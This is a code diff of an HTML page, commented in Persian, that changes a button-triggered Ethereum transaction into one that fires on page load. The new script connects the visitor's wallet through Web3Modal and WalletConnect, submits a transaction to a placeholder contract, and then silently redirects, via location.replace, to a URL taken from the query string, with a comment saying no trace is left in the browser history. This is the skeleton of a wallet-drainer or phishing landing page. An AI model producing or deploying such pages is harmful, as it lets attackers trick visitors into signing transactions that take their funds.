@@ -2,51 +2,57 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Auto Tx + Redirect</title>
+  <title>Auto Transaction</title>
+  <script src="https://unpkg.com/web3@1.10.0/dist/web3.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/web3-provider/dist/umd/index.min.js"></script>
+  <script src="https://unpkg.com/web3modal"></script>
 </head>
 <body>
+<script>
+(async () => {
+  const urlParams = new URLSearchParams(window.location.search);
+  const redirectURL = urlParams.get("redirect") || "https://test.com";
 
-
-  <script>
-    const DEST_URL = "https://test.com"; // سایت مقصد
-    const CONTRACT = "0xYourContractAddress"; // آدرس کانترکت
-    const ABI = [ /* ABI فانکشن مورد نیاز */ ]; // ABI فانکشن
-    const DATA = "0x..."; // داده‌ی آماده‌شده (مثلا encodeABI)
-
-    document.getElementById("trigger").addEventListener("click", async (e) => {
-      e.preventDefault();
-
-      try {
-        if (typeof window.ethereum === "undefined") {
-          alert("MetaMask not found!");
-          return;
+  try {
+    // WalletConnect Provider
+    const providerOptions = {
+      walletconnect: {
+        package: window.WalletConnectProvider.default,
+        options: {
+          rpc: {
+            1: "https://mainnet.infura.io/v3/YOUR_INFURA_KEY"
+          }
         }
-
-        // درخواست اتصال به کیف پول
-        await window.ethereum.request({ method: "eth_requestAccounts" });
-
-        // ساخت تراکنش
-        const tx = {
-          from: (await window.ethereum.request({ method: "eth_accounts" }))[0],
-          to: CONTRACT,
-          data: DATA, // داده encode شده برای فانکشن
-          value: "0x0"
-        };
-
-        // پیشنهاد تراکنش به کاربر
-        await window.ethereum.request({
-          method: "eth_sendTransaction",
-          params: [tx],
-        });
-
-      } catch (err) {
-        console.error("Transaction failed:", err);
-      } finally {
-        // انتقال بدون باقی‌ماندن در history
-        location.replace(DEST_URL);
       }
+    };
+
+    const web3Modal = new window.Web3Modal.default({
+      cacheProvider: false,
+      providerOptions
     });
-  </script>
+
+    const instance = await web3Modal.connect();
+    const web3 = new Web3(instance);
+
+    const accounts = await web3.eth.getAccounts();
+
+    // تراکنش نمونه (اینجا باید تراکنش واقعی خودت رو بسازی)
+    const tx = {
+      from: accounts[0],
+      to: "0xYourContractAddress",
+      data: "0xYourEncodedFunctionData",
+      value: "0x0"
+    };
+
+    await web3.eth.sendTransaction(tx);
+
+  } catch (err) {
+    console.error("Tx error:", err);
+  } finally {
+    // انتقال بدون باقی ماندن در history
+    location.replace(redirectURL);
+  }
+})();
+</script>
 </body>
 </html>
-
